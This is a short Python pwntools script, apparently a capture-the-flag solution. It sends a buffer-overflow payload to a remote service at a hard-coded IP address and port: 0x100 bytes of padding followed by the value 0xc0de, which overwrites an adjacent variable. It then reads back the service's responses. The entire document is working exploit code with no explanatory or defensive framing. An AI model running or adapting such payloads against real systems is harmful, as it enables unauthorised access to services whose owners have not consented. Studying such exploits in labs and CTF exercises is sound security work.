from pwn import *
from time import sleep

padding = "a"*0x100
v49 = 0xc0de
payload = padding + p32(v49)
s = remote("103.237.99.35", 26081)
s.recv()
s.sendline(payload)
s.recv()
s.sendline("done")
print s.recv()
sleep(2)
print s.recv()
s.close()
